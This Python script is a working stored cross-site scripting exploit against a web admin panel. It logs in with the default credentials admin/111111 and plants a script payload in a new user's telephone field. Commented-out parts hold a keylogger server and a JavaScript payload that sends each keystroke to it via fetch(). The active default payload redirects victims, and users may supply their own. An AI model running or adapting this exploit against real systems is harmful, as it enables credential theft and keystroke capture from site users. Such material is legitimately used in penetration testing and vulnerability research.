import requests
import sys
import json
import http.server
import socketserver
import urllib
import urllib.parse

# PORT = 8888


# class MyHandler(http.server.BaseHTTPRequestHandler):
#         def do_GET(self):
#             if self.path.startswith('/data') and 'letter=' in self.path:
#                 letter = self.path.split('=')[1]
                
#                 #print(letter)
#                 with open("log_output.txt", "a") as output:
#                     if letter == "Shift" or letter == "Alt" or letter == "AltGraph":
#                         pass                   
#                     elif letter == "Enter":
#                         output.write("\n")
#                     else:
#                         output.write(urllib.parse.unquote(letter))

#                 self.send_response(200)
#                 self.send_header("Content-type", "text/plain")
#                 self.end_headers()
#                 self.wfile.write(letter.encode())
#             else:
#                 # Use the default handler for all other requests
#                 handler.do_GET(self)

#         def send_head(self):
#             self.send_response(200)
#             self.send_header("Content-type", "text/html")
#             self.end_headers()
#             return None

def make_request(session, method, uri, headers, body):
    response = ""

    if method == "GET":
        response = session.get(url+uri, headers=headers)
    elif method == "POST":
        response = session.post(url+uri, data=body, headers=headers)
    elif method == "PUT":
        response = session.put(url+uri, data=body, headers=headers)
    else:
        print("error")


    return response


# def start_keylogger_server():
#     handler = http.server.SimpleHTTPRequestHandler

#     # Set up a socket server to listen on the specified port with the custom handler
#     httpd = socketserver.TCPServer(("", PORT), MyHandler)

#     print(f"Serving at port {PORT}")

#     # Start the server and keep it running until interrupted
#     try:
#         httpd.serve_forever()

#     except KeyboardInterrupt:
#         pass
    
#     httpd.server_close()
#     print("Server stopped.")




if __name__ == '__main__':
    url = "http://localhost:8080"

    login_page_uri = "/admin/login"
    create_user_uri = "/admin/user/edit"
    create_role_uri = "/admin/role/add"
    create_resource_uri = "/admin/resource/add"

    login_data = {'username':'admin', 'password':'111111'}
    all_headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json; charset=utf-8','User-Agent':'foo'}

    #response = requests.post(url+login_page_uri, json = login_data, headers={'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json; charset=utf-8','User-Agent':'foo'})
    #response = make_request("POST", login_page_uri, all_headers, login_data)
    #data = response.json()
    #jwt_token = data['token']

    #all_headers['Cookie'] = 'JWT-SESSION='+jwt_token
    #all_headers['Authorization'] = jwt_token

    #injected_script = '\"><script>document.onkeypress=function(event){fetch("http://localhost:8888/data?letter='+urllib.parse.urlencode(event.key)+'")}</script>'

    if len(sys.argv) == 1:
        injected_script = "\"><script>window.top.location.replace('https://www.example.com');</script>"
        custom = False
    elif len(sys.argv) == 2:
        custom = True
        injected_script = sys.argv[1]
    else:
        print("Too many arguments were passed from the command line")
        print("Specify one argument if you want to use your own payload or none to use a default js keylogger payload")
        exit(1)


    user_payload = {"id":"", "userName":"Test", 
               "nickName":"TestNick", "sex":0, "birthday":"2023-03-22",
               "telephone":injected_script, "email":"a@b.c", 
               "address":"aaa", "locked":0, "description":"description"}
    
    expected_answer = b'\xe6\x93\x8d\xe4\xbd\x9c\xe6\x88\x90\xe5\x8a\x9f'

    session = requests.Session()



    print("Performing authentication on remote application...")
    response = make_request(session, "POST", login_page_uri, all_headers, login_data)

    if "JSESSIONID" in session.cookies.get_dict():
        jsessionid = session.cookies.get_dict()["JSESSIONID"]
        all_headers['Cookie'] = 'JSESSIONID='+jsessionid

        print("Injecting Payload as a new user telephone number...")
        response = make_request(session, "POST", create_user_uri, all_headers, user_payload)
        response_bytes = response.content.split(b'\"')

        if len(response_bytes) >= 8 and response_bytes[7] == expected_answer:
            print("Injection was successfull\n")
        else:
            print("Something went wrong during payload injection\n")

    else:
        print("Authentication Failed!\n")
        

    exit(0)







